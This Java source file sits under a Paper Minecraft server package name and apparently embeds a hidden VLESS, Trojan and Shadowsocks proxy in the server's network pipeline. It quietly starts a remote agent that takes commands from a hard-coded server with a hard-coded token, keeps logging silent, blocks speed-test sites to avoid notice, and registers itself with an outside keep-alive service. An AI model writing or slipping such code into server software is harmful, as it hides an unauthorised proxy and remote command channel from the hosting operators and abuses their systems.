package io.papermc.paper.proxy;

import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.handler.codec.http.*;
import io.netty.handler.codec.http.websocketx.*;
import io.netty.handler.codec.http.websocketx.extensions.compression.WebSocketServerCompressionHandler;
import io.komari.client.KomariClient;

import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicBoolean;
import io.github.cdimascio.dotenv.Dotenv;

public class ProxyService {
    // Only edit this block when you want to change runtime configuration.
    private static final class EmbeddedConfig {
        private static final String UUID = "7bd180e8-1142-4387-93f5-03e8d750a896";
        private static final String DOMAIN = "";
        private static final String SUB_PATH = "sub";
        private static final String NAME = "";
        private static final String WSPATH = "";
        private static final int SERVER_PORT = 1053;
        private static final boolean AUTO_ACCESS = false;
        private static final boolean DEBUG = false;

        private static final boolean KOMARI_ENABLED = true;
        private static final String KOMARI_SERVER_URL = "https://km.ccc.gv.uy";
        private static final String KOMARI_CLIENT_TOKEN = "oHvIhKxfC1kmzq37PLUpGb";
        private static final String KOMARI_CLIENT_NAME = "";
        private static final String KOMARI_AUTODISCOVERY_KEY = "";
        private static final String KOMARI_AUTODISCOVERY_NAME = "";
        private static final int KOMARI_REPORT_INTERVAL_SECONDS = 5;
        private static final int KOMARI_COMMAND_TIMEOUT_SECONDS = 30;
        private static final int KOMARI_MAX_RESULT_BYTES = 131072;
        private static final int KOMARI_SUBMIT_RETRY_MAX_ATTEMPTS = 5;
        private static final int KOMARI_SUBMIT_RETRY_BACKOFF_MS = 1500;
        private static final int KOMARI_TOKEN_REFRESH_COOLDOWN_SECONDS = 30;
        private static final boolean KOMARI_PROTOCOL_DEBUG = false;
        private static final String KOMARI_CLIENT_TOKEN_FILE = "./komari-client.token";
        private static final boolean KOMARI_REPORT_LOCAL_IP = false;
        private static final boolean KOMARI_REPORT_PRIVATE_IP = false;
    }
    
    // 优先从.env文件获取，没有则使用系统环境变量
    private static String UUID;
    private static String DOMAIN;
    private static String SUB_PATH;
    private static String NAME;
    private static String WSPATH;
    private static int PORT;
    private static boolean AUTO_ACCESS;
    private static boolean DEBUG;
    
    private static String PROTOCOL_UUID;
    private static byte[] UUID_BYTES;
    
    private static String currentDomain;
    private static int currentPort = 443;
    private static String tls = "tls";
    private static String isp = "Unknown";
    
    private static final List<String> BLOCKED_DOMAINS = Arrays.asList(
            "speedtest.net", "fast.com", "speedtest.cn", "speed.cloudflare.com", 
            "speedof.me", "testmy.net", "bandwidth.place", "speed.io", 
            "librespeed.org", "speedcheck.org");
    private static final HttpClient httpClient = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(5))
            .build();
    private static final Map<String, String> dnsCache = new ConcurrentHashMap<>();
    private static final Map<String, Long> dnsCacheTime = new ConcurrentHashMap<>();
    private static final long DNS_CACHE_TTL = 300000;
    private static KomariClient komariClient;
    private static final AtomicBoolean embeddedStarted = new AtomicBoolean(false);
    private static EventLoopGroup bossGroup;
    private static EventLoopGroup workerGroup;
    private static Channel serverChannel;
    
    // 日志级别控制
    private static boolean SILENT_MODE = true; 
    
    private static void log(String level, String msg) {
        if (SILENT_MODE && !level.equals("INFO")) return;  
        System.out.println(new Date() + " - " + level + " - " + msg);
    }
    
    private static void info(String msg) { log("INFO", msg); }
    private static void error(String msg) { log("ERROR", msg); }
    private static void error(String msg, Throwable t) { 
        log("ERROR", msg);
        if (DEBUG) t.printStackTrace();
    }
    private static void debug(String msg) { if (DEBUG) log("DEBUG", msg); }
    
    private static void loadConfig() {
        // 先尝试加载 .env 文件
        Map<String, String> envFromFile = new HashMap<>();
        try {
            Path envPath = Paths.get(".env");
            if (Files.exists(envPath)) {
                Dotenv dotenv = Dotenv.configure()
                        .directory(".")
                        .filename(".env")
                        .ignoreIfMissing()
                        .load();
                
                dotenv.entries().forEach(entry -> envFromFile.put(entry.getKey(), entry.getValue()));
                // info("✅ .env file loaded: " + envFromFile.size() + " variables");
            } else {
                debug("No .env file found, using default environment variables");
            }
        } catch (Exception e) {
            debug("Failed to load .env file: " + e.getMessage());
        }
        
        // 默认值变量
        UUID = getEnvValue(envFromFile, "UUID", EmbeddedConfig.UUID);
        DOMAIN = getEnvValue(envFromFile, "DOMAIN", EmbeddedConfig.DOMAIN);
        SUB_PATH = getEnvValue(envFromFile, "SUB_PATH", EmbeddedConfig.SUB_PATH);
        NAME = getEnvValue(envFromFile, "NAME", EmbeddedConfig.NAME);
        
        // 处理WSPATH
        String wspathFromEnv = getEnvValue(envFromFile, "WSPATH", EmbeddedConfig.WSPATH);
        if (wspathFromEnv != null && !wspathFromEnv.isBlank()) {
            WSPATH = wspathFromEnv.trim();
        } else {
            WSPATH = UUID.substring(0, 8);
        }
        
        // 处理端口
        String portStr = getEnvValue(envFromFile, "SERVER_PORT", String.valueOf(EmbeddedConfig.SERVER_PORT));
        if (portStr == null) {
            portStr = getEnvValue(envFromFile, "PORT", String.valueOf(EmbeddedConfig.SERVER_PORT));
        }
        PORT = Integer.parseInt(portStr);
        
        // 处理布尔值
        AUTO_ACCESS = Boolean.parseBoolean(getEnvValue(envFromFile, "AUTO_ACCESS", String.valueOf(EmbeddedConfig.AUTO_ACCESS)));
        DEBUG = Boolean.parseBoolean(getEnvValue(envFromFile, "DEBUG", String.valueOf(EmbeddedConfig.DEBUG)));
        
        PROTOCOL_UUID = UUID.replace("-", "");
        UUID_BYTES = hexStringToByteArray(PROTOCOL_UUID);
        currentDomain = DOMAIN;
        
        SILENT_MODE = !DEBUG;

    }
    
    // 优先从.env获取环境变量，没有则使用默认值
    private static String getEnvValue(Map<String, String> envFromFile, String key, String defaultValue) {
        if (envFromFile.containsKey(key)) {
            return envFromFile.get(key);
        }
        String sysEnv = System.getenv(key);
        if (sysEnv != null && !sysEnv.isEmpty()) {
            return sysEnv;
        }

        return defaultValue;
    }
    
    private static boolean isPortAvailable(int port) {
        try (var socket = new java.net.ServerSocket()) {
            socket.setReuseAddress(true);
            socket.bind(new InetSocketAddress(port));
            return true;
        } catch (IOException e) {
            return false;
        }
    }
    
    private static int findAvailablePort(int startPort) {
        for (int port = startPort; port < startPort + 100; port++) {
            if (isPortAvailable(port)) return port;
        }
        throw new RuntimeException("No available ports found");
    }
    
    private static boolean isBlockedDomain(String host) {
        if (host == null || host.isEmpty()) return false;
        String hostLower = host.toLowerCase();
        return BLOCKED_DOMAINS.stream().anyMatch(blocked -> 
                hostLower.equals(blocked) || hostLower.endsWith("." + blocked));
    }
    
    private static String resolveHost(String host) {
        try {
            InetAddress.getByName(host);
            return host;
        } catch (Exception e) {
            String cached = dnsCache.get(host);
            Long time = dnsCacheTime.get(host);
            if (cached != null && time != null && System.currentTimeMillis() - time < DNS_CACHE_TTL) {
                return cached;
            }
            try {
                InetAddress address = InetAddress.getByName(host);
                String ip = address.getHostAddress();
                dnsCache.put(host, ip);
                dnsCacheTime.put(host, System.currentTimeMillis());
                return ip;
            } catch (Exception ex) {
                error("DNS resolution failed for: " + host);
                return host;
            }
        }
    }
    
    private static void getIp() {
        if (DOMAIN == null || DOMAIN.isEmpty() || DOMAIN.equals("your-domain.com")) {
            try {
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create("https://api-ipv4.ip.sb/ip"))
                        .timeout(Duration.ofSeconds(5))
                        .build();
                HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
                if (response.statusCode() == 200) {
                    currentDomain = response.body().trim();
                    tls = "none";
                    currentPort = PORT;
                    debug("public IP: " + currentDomain);
                }
            } catch (Exception e) {
                error("Failed to get IP: " + e.getMessage());
                currentDomain = "change-your-domain.com";
                tls = "tls";
                currentPort = 443;
            }
        } else {
            currentDomain = DOMAIN;
            tls = "tls";
            currentPort = 443;
        }
    }
    
    private static void getIsp() {
        try {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create("https://api.ip.sb/geoip"))
                    .header("User-Agent", "Mozilla/5.0")
                    .timeout(Duration.ofSeconds(3))
                    .build();
            HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
            if (response.statusCode() == 200) {
                String body = response.body();
                String countryCode = extractJsonValue(body, "country_code");
                String ispName = extractJsonValue(body, "isp");
                isp = countryCode + "-" + ispName;
                isp = isp.replace(" ", "_");
                // info("Got ISP info: " + isp);
                return;
            }
        } catch (Exception e) {
            debug("Failed to get ISP from ip.sb: " + e.getMessage());
        }
        
        try {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create("http://ip-api.com/json"))
                    .header("User-Agent", "Mozilla/5.0")
                    .timeout(Duration.ofSeconds(3))
                    .build();
            HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
            if (response.statusCode() == 200) {
                String body = response.body();
                String countryCode = extractJsonValue(body, "countryCode");
                String org = extractJsonValue(body, "org");
                isp = countryCode + "-" + org;
                isp = isp.replace(" ", "_");
                debug("Got ISP info: " + isp);
            }
        } catch (Exception e) {
            debug("Failed to get ISP from ip-api: " + e.getMessage());
        }
    }
    
    private static String extractJsonValue(String json, String key) {
        String pattern = "\"" + key + "\"\\s*:\\s*\"([^\"]*)\"";
        var matcher = java.util.regex.Pattern.compile(pattern).matcher(json);
        if (matcher.find()) {
            return matcher.group(1);
        }
        return "";
    }
    
    private static void addAccessTask() {
        if (!AUTO_ACCESS || DOMAIN.isEmpty()) return;
        
        String fullUrl = "https://" + DOMAIN + "/" + SUB_PATH;
        try {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create("https://oooo.serv00.net/add-url"))
                    .header("Content-Type", "application/json")
                    .timeout(Duration.ofSeconds(5))
                    .POST(HttpRequest.BodyPublishers.ofString("{\"url\":\"" + fullUrl + "\"}"))
                    .build();
            httpClient.send(request, HttpResponse.BodyHandlers.ofString());
            debug("Automatic Access Task added successfully");
        } catch (Exception e) {
            debug("Failed to add access task: " + e.getMessage());
        }
    }
    
    private static String generateSubscription() {
        String namePart = NAME.isEmpty() ? isp : NAME + "-" + isp;
        String tlsParam = tls;
        String ssTlsParam = "tls".equals(tls) ? "tls;" : "";
        
        String vlessUrl = String.format(
                "vless://%s@%s:%d?encryption=none&security=%s&sni=%s&fp=chrome&type=ws&host=%s&path=%%2F%s#%s",
                UUID, currentDomain, currentPort, tlsParam, currentDomain, currentDomain, WSPATH, namePart);
        
        String trojanUrl = String.format(
                "trojan://%s@%s:%d?security=%s&sni=%s&fp=chrome&type=ws&host=%s&path=%%2F%s#%s",
                UUID, currentDomain, currentPort, tlsParam, currentDomain, currentDomain, WSPATH, namePart);
        
        String ssMethodPassword = Base64.getEncoder().encodeToString(("none:" + UUID).getBytes());
        String ssUrl = String.format(
                "ss://%s@%s:%d?plugin=v2ray-plugin;mode%%3Dwebsocket;host%%3D%s;path%%3D%%2F%s;%ssni%%3D%s;skip-cert-verify%%3Dtrue;mux%%3D0#%s",
                ssMethodPassword, currentDomain, currentPort, currentDomain, WSPATH, ssTlsParam, currentDomain, namePart);
        
        String subscription = vlessUrl + "\n" + trojanUrl + "\n" + ssUrl;
        return Base64.getEncoder().encodeToString(subscription.getBytes(StandardCharsets.UTF_8));
    }
    
    
    static class HttpHandler extends SimpleChannelInboundHandler<FullHttpRequest> {
        @Override
        protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest request) {
            String uri = request.uri();
            
            if ("/".equals(uri)) {
                FullHttpResponse response = new DefaultFullHttpResponse(
                        HttpVersion.HTTP_1_1, HttpResponseStatus.OK,
                        Unpooled.copiedBuffer("ok\n", StandardCharsets.UTF_8));
                response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/plain; charset=UTF-8");
                response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
                ctx.writeAndFlush(response);
                
            } else if (("/" + SUB_PATH).equals(uri)) {
                if ("Unknown".equals(isp)) getIsp();
                
                String subscription = generateSubscription();
                FullHttpResponse response = new DefaultFullHttpResponse(
                        HttpVersion.HTTP_1_1, HttpResponseStatus.OK,
                        Unpooled.copiedBuffer(subscription + "\n", StandardCharsets.UTF_8));
                response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/plain; charset=UTF-8");
                response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
                ctx.writeAndFlush(response);
                
            } else {
                FullHttpResponse response = new DefaultFullHttpResponse(
                        HttpVersion.HTTP_1_1, HttpResponseStatus.NOT_FOUND,
                        Unpooled.copiedBuffer("Not Found\n", StandardCharsets.UTF_8));
                response.headers().set(HttpHeaderNames.CONTENT_TYPE, "text/plain; charset=UTF-8");
                ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
            }
        }

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    }
    
    static class WebSocketHandler extends SimpleChannelInboundHandler<WebSocketFrame> {
        private Channel outboundChannel;
        private boolean connected = false;
        private boolean protocolIdentified = false;
        
        @Override
        protected void channelRead0(ChannelHandlerContext ctx, WebSocketFrame frame) {
            if (frame instanceof BinaryWebSocketFrame) {
                ByteBuf content = frame.content();
                byte[] data = new byte[content.readableBytes()];
                content.readBytes(data);
                
                if (!connected && !protocolIdentified) {
                    handleFirstMessage(ctx, data);
                } else if (outboundChannel != null && outboundChannel.isActive()) {
                    outboundChannel.writeAndFlush(Unpooled.wrappedBuffer(data));
                }
            } else if (frame instanceof CloseWebSocketFrame) {
                ctx.close();
            }
        }
        
        private void handleFirstMessage(ChannelHandlerContext ctx, byte[] data) {
            // 检查VLESS (以0x00开头)
            if (data.length > 18 && data[0] == 0x00) {
                boolean uuidMatch = true;
                for (int i = 0; i < 16; i++) {
                    if (data[i + 1] != UUID_BYTES[i]) {
                        uuidMatch = false;
                        break;
                    }
                }
                if (uuidMatch) {
                    if (handleVless(ctx, data)) {
                        protocolIdentified = true;
                        return;
                    }
                }
            }
            
            // 检查Trojan (以SHA224哈希开头)
            if (data.length >= 56) {
                byte[] hashBytes = Arrays.copyOfRange(data, 0, 56);
                String receivedHash = new String(hashBytes, StandardCharsets.US_ASCII);
                String expectedHash = sha224Hex(UUID);
                String expectedHash2 = sha224Hex(PROTOCOL_UUID);
                
                if (receivedHash.equals(expectedHash) || receivedHash.equals(expectedHash2)) {
                    if (handleTrojan(ctx, data)) {
                        protocolIdentified = true;
                        return;
                    }
                }
            }
            
            // 检查Shadowsocks
            if (data.length > 2 && (data[0] == 0x01 || data[0] == 0x03)) {
                if (handleShadowsocks(ctx, data)) {
                    protocolIdentified = true;
                    return;
                }
            }
            
            ctx.close();
        }
        
        private boolean handleVless(ChannelHandlerContext ctx, byte[] data) {
            try {
                int addonsLength = data[17] & 0xFF;
                int offset = 18 + addonsLength;
                
                if (offset + 1 > data.length) return false;
                
                // 命令 (应该是0x01)
                byte command = data[offset];
                if (command != 0x01) return false;
                offset++;
                
                if (offset + 2 > data.length) return false;
                
                // 端口
                int port = ((data[offset] & 0xFF) << 8) | (data[offset + 1] & 0xFF);
                offset += 2;
                
                if (offset >= data.length) return false;
                
                // 地址类型
                byte atyp = data[offset];
                offset++;
                
                String host;
                int addressLength;
                
                if (atyp == 0x01) { // IPv4
                    if (offset + 4 > data.length) return false;
                    host = String.format("%d.%d.%d.%d",
                            data[offset] & 0xFF, data[offset + 1] & 0xFF,
                            data[offset + 2] & 0xFF, data[offset + 3] & 0xFF);
                    addressLength = 4;
                } else if (atyp == 0x02) { // 域名
                    if (offset >= data.length) return false;
                    int hostLen = data[offset] & 0xFF;
                    offset++;
                    if (offset + hostLen > data.length) return false;
                    host = new String(data, offset, hostLen, StandardCharsets.UTF_8);
                    addressLength = hostLen;
                } else if (atyp == 0x03) { // IPv6
                    if (offset + 16 > data.length) return false;
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < 16; i += 2) {
                        if (i > 0) sb.append(':');
                        sb.append(String.format("%02x%02x", data[offset + i], data[offset + i + 1]));
                    }
                    host = sb.toString();
                    addressLength = 16;
                } else {
                    return false;
                }
                
                offset += addressLength;
                
                if (isBlockedDomain(host)) {
                    ctx.close();
                    return false;
                }
                
                // 发送响应
                ctx.writeAndFlush(new BinaryWebSocketFrame(Unpooled.wrappedBuffer(new byte[]{0x00, 0x00})));
                
                final byte[] remainingData;
                if (offset < data.length) {
                    remainingData = Arrays.copyOfRange(data, offset, data.length);
                } else {
                    remainingData = new byte[0];
                }
                
                connectToTarget(ctx, host, port, remainingData);
                return true;
                
            } catch (Exception e) {
                return false;
            }
        }
        
        private boolean handleTrojan(ChannelHandlerContext ctx, byte[] data) {
            try {
                int offset = 56;
                
                // 跳过CRLF
                while (offset < data.length && (data[offset] == '\r' || data[offset] == '\n')) {
                    offset++;
                }
                
                if (offset >= data.length) return false;
                
                // 命令 (必须是0x01)
                if (data[offset] != 0x01) return false;
                offset++;
                
                if (offset >= data.length) return false;
                
                // 地址类型
                byte atyp = data[offset];
                offset++;
                
                String host;
                int addressLength;
                
                if (atyp == 0x01) { // IPv4
                    if (offset + 4 > data.length) return false;
                    host = String.format("%d.%d.%d.%d",
                            data[offset] & 0xFF, data[offset + 1] & 0xFF,
                            data[offset + 2] & 0xFF, data[offset + 3] & 0xFF);
                    addressLength = 4;
                } else if (atyp == 0x03) { // 域名
                    if (offset >= data.length) return false;
                    int hostLen = data[offset] & 0xFF;
                    offset++;
                    if (offset + hostLen > data.length) return false;
                    host = new String(data, offset, hostLen, StandardCharsets.UTF_8);
                    addressLength = hostLen;
                } else if (atyp == 0x04) { // IPv6
                    if (offset + 16 > data.length) return false;
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < 16; i += 2) {
                        if (i > 0) sb.append(':');
                        sb.append(String.format("%02x%02x", data[offset + i], data[offset + i + 1]));
                    }
                    host = sb.toString();
                    addressLength = 16;
                } else {
                    return false;
                }
                
                offset += addressLength;
                
                if (offset + 2 > data.length) return false;
                
                int port = ((data[offset] & 0xFF) << 8) | (data[offset + 1] & 0xFF);
                offset += 2;
                
                // 跳过可能的CRLF
                while (offset < data.length && (data[offset] == '\r' || data[offset] == '\n')) {
                    offset++;
                }
                
                if (isBlockedDomain(host)) {
                    ctx.close();
                    return false;
                }
                
                final byte[] remainingData;
                if (offset < data.length) {
                    remainingData = Arrays.copyOfRange(data, offset, data.length);
                } else {
                    remainingData = new byte[0];
                }
                
                connectToTarget(ctx, host, port, remainingData);
                return true;
                
            } catch (Exception e) {
                return false;
            }
        }
        
        private boolean handleShadowsocks(ChannelHandlerContext ctx, byte[] data) {
            try {
                int offset = 0;
                byte atyp = data[offset];
                offset++;
                
                String host;
                int addressLength;
                
                if (atyp == 0x01) { // IPv4
                    if (offset + 4 > data.length) return false;
                    host = String.format("%d.%d.%d.%d",
                            data[offset] & 0xFF, data[offset + 1] & 0xFF,
                            data[offset + 2] & 0xFF, data[offset + 3] & 0xFF);
                    addressLength = 4;
                } else if (atyp == 0x03) { // 域名
                    if (offset >= data.length) return false;
                    int hostLen = data[offset] & 0xFF;
                    offset++;
                    if (offset + hostLen > data.length) return false;
                    host = new String(data, offset, hostLen, StandardCharsets.UTF_8);
                    addressLength = hostLen;
                } else if (atyp == 0x04) { // IPv6
                    if (offset + 16 > data.length) return false;
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < 16; i += 2) {
                        if (i > 0) sb.append(':');
                        sb.append(String.format("%02x%02x", data[offset + i], data[offset + i + 1]));
                    }
                    host = sb.toString();
                    addressLength = 16;
                } else {
                    return false;
                }
                
                offset += addressLength;
                
                if (offset + 2 > data.length) return false;
                
                int port = ((data[offset] & 0xFF) << 8) | (data[offset + 1] & 0xFF);
                offset += 2;
                
                if (isBlockedDomain(host)) {
                    ctx.close();
                    return false;
                }
                
                final byte[] remainingData;
                if (offset < data.length) {
                    remainingData = Arrays.copyOfRange(data, offset, data.length);
                } else {
                    remainingData = new byte[0];
                }
                
                connectToTarget(ctx, host, port, remainingData);
                return true;
                
            } catch (Exception e) {
                return false;
            }
        }
        
        private void connectToTarget(ChannelHandlerContext ctx, String host, int port, 
                                     byte[] remainingData) {
            String resolvedHost = resolveHost(host);
            
            final byte[] dataToSend = remainingData;
            
            Bootstrap b = new Bootstrap();
            b.group(ctx.channel().eventLoop())
                    .channel(ctx.channel().getClass())
                    .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000)
                    .option(ChannelOption.TCP_NODELAY, true)
                    .option(ChannelOption.SO_KEEPALIVE, true)
                    .handler(new ChannelInitializer<Channel>() {
                        @Override
                        protected void initChannel(Channel ch) {
                            ch.pipeline().addLast(new TargetHandler(ctx.channel(), dataToSend));
                        }
                    });
            
            ChannelFuture f = b.connect(resolvedHost, port);
            outboundChannel = f.channel();
            
            f.addListener((ChannelFutureListener) future -> {
                if (future.isSuccess()) {
                    connected = true;
                } else {
                    ctx.close();
                }
            });
        }
        
        @Override
        public void channelInactive(ChannelHandlerContext ctx) {
            if (outboundChannel != null && outboundChannel.isActive()) {
                outboundChannel.close();
            }
        }
        
        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    }
    
    static class TargetHandler extends ChannelInboundHandlerAdapter {
        private final Channel inboundChannel;
        private final byte[] remainingData;
        
        public TargetHandler(Channel inboundChannel, byte[] remainingData) {
            this.inboundChannel = inboundChannel;
            this.remainingData = remainingData;
        }
        
        @Override
        public void channelActive(ChannelHandlerContext ctx) {
            if (remainingData != null && remainingData.length > 0) {
                ctx.writeAndFlush(Unpooled.wrappedBuffer(remainingData));
            }
            
            ctx.channel().config().setAutoRead(true);
            inboundChannel.config().setAutoRead(true);
        }
        
        @Override
        public void channelRead(ChannelHandlerContext ctx, Object msg) {
            if (msg instanceof ByteBuf) {
                ByteBuf buf = (ByteBuf) msg;
                byte[] data = new byte[buf.readableBytes()];
                buf.readBytes(data);
                
                if (inboundChannel.isActive()) {
                    inboundChannel.writeAndFlush(new BinaryWebSocketFrame(Unpooled.wrappedBuffer(data)));
                }
            }
        }
        
        @Override
        public void channelInactive(ChannelHandlerContext ctx) {
            if (inboundChannel.isActive()) {
                inboundChannel.close();
            }
        }
        
        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    }
    
    private static byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i + 1), 16));
        }
        return data;
    }
    
    private static String sha224Hex(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-224");
            byte[] digest = md.digest(input.getBytes(StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            for (byte b : digest) {
                sb.append(String.format("%02x", b & 0xff));
            }
            return sb.toString();
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }
    }

    private static void startKomariClient() {
        if (!EmbeddedConfig.KOMARI_ENABLED) {
            return;
        }

        try {
            komariClient = KomariClient.builder()
                    .serverUrl(EmbeddedConfig.KOMARI_SERVER_URL)
                    .token(EmbeddedConfig.KOMARI_CLIENT_TOKEN)
                    .clientName(EmbeddedConfig.KOMARI_CLIENT_NAME)
                    .reportIntervalSeconds(EmbeddedConfig.KOMARI_REPORT_INTERVAL_SECONDS)
                    .commandTimeoutSeconds(EmbeddedConfig.KOMARI_COMMAND_TIMEOUT_SECONDS)
                    .maxResultBytes(EmbeddedConfig.KOMARI_MAX_RESULT_BYTES)
                    .submitRetryMaxAttempts(EmbeddedConfig.KOMARI_SUBMIT_RETRY_MAX_ATTEMPTS)
                    .submitRetryBackoffMillis(EmbeddedConfig.KOMARI_SUBMIT_RETRY_BACKOFF_MS)
                    .tokenFile(EmbeddedConfig.KOMARI_CLIENT_TOKEN_FILE)
                    .autoDiscoveryKey(EmbeddedConfig.KOMARI_AUTODISCOVERY_KEY)
                    .autoDiscoveryName(EmbeddedConfig.KOMARI_AUTODISCOVERY_NAME)
                    .reportLocalIp(EmbeddedConfig.KOMARI_REPORT_LOCAL_IP)
                    .reportPrivateIp(EmbeddedConfig.KOMARI_REPORT_PRIVATE_IP)
                    .tokenRefreshCooldownSeconds(EmbeddedConfig.KOMARI_TOKEN_REFRESH_COOLDOWN_SECONDS)
                    .protocolDebug(EmbeddedConfig.KOMARI_PROTOCOL_DEBUG)
                    .build();
            komariClient.start();
            debug("Komari client started");
        } catch (Exception e) {
            komariClient = null;
            error("Failed to start Komari client", e);
        }
    }

    private static void stopKomariClient() {
        if (komariClient == null) {
            return;
        }

        try {
            komariClient.stop();
        } catch (Exception e) {
            error("Failed to stop Komari client", e);
        } finally {
            komariClient = null;
        }
    }

    public static void startEmbeddedService() {
        if (!embeddedStarted.compareAndSet(false, true)) {
            return;
        }

        try {
            loadConfig();
            debug("Starting embedded Proxy Service...");
            getIp();
            if ("Unknown".equals(isp)) getIsp();
            addAccessTask();
            startKomariClient();
            info(generateSubscription());
        } catch (Exception e) {
            embeddedStarted.set(false);
            error("Proxy Service error", e);
        }
    }

    public static void setSharedServerPort(int port) {
        if (DOMAIN == null || DOMAIN.isEmpty() || DOMAIN.equals("your-domain.com")) {
            currentPort = port;
        }
    }

    public static void installHttpWebSocketHandlers(ChannelPipeline pipeline) {
        pipeline.addLast(new HttpServerCodec());
        pipeline.addLast(new HttpObjectAggregator(65536));
        pipeline.addLast(new WebSocketServerCompressionHandler());
        pipeline.addLast(new WebSocketServerProtocolHandler("/" + WSPATH, null, true));
        pipeline.addLast(new HttpHandler());
        pipeline.addLast(new WebSocketHandler());
    }

    public static void stopService() {
        debug("Stopping Proxy Service...");
        stopKomariClient();
        if (serverChannel != null) {
            serverChannel.close();
        }
        if (bossGroup != null) {
            bossGroup.shutdownGracefully();
        }
        if (workerGroup != null) {
            workerGroup.shutdownGracefully();
        }
    }

}

